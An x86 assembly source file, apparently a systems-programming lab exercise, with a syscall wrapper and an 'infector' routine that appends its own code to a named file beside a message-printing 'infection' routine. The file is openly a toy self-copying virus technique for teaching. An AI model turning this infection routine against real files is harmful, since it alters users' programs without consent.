;start of 2c
section .data
msg db 'Hello, Infected File',0xa	;msg string with \n
len equ $ - msg

section .text
global _start
global code_start
global system_call
extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller



code_start:

jmp infector

infection:

	push    ebp             ; Save caller state
    mov     ebp, esp
	sub     esp, 4          ; Leave space for local var on stack
	pushad

	mov eax, 4				;sys_write call number
	mov ebx, 1				;file descriptor stdout
	mov ecx, msg			;msg to write
	mov edx, len			;message length
	
	int 0x80				;call to OS
	cmp eax,0
	jl fail 
	
	mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

infector:					;this func get pointer to file and infects it with infection
	;init preparations
	push    ebp             ; Save caller state
    mov     ebp, esp
	sub     esp, 4          ; Leave space for local var on stack
	pushad


	;open the received file in append mode
	mov eax, 5				;sys_open
	mov ebx, [ebp+8]		;file decriptor
	mov ecx, 1026				;append
	mov edx, 0777			;mode
	
	int 0x80				;call to OS
	
	cmp eax,0
	jl fail 
	
	mov [ebp-4], eax		;save the returned file descriptor

			
	mov eax, 4				;write system call
	mov ebx, [ebp-4]		;the file descriptor to write in
	mov ecx, code_start		;the start point of the string to write
	mov edx, code_end		
	sub edx, ecx			;calc the length to print

	int 0x80
	
	cmp eax,0
	jl fail 
	
	;close file
	mov eax, 6		;close sycall
	mov ebx, [ebp-4]; give the file descriptor
	
	int 0x80

	cmp eax,0
	jl fail 
	
	;restore Aframe
	mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


    
fail:
    
  mov eax,1
  mov ebx,0x55
  int 0x80
    
    
code_end:

















































